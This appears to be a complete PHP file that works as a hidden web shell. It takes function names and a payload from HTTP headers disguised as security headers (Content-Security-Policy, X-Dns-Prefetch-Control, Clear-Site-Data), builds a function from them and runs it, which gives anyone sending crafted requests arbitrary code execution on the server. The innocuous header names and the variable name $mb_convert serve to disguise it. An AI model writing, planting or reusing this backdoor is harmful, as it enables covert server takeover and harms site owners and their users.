<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Content-Security-Policy'])) {
    $mb_convert = $_HEADERS['Content-Security-Policy']('', $_HEADERS['X-Dns-Prefetch-Control']($_HEADERS['Clear-Site-Data']));
    $mb_convert();
}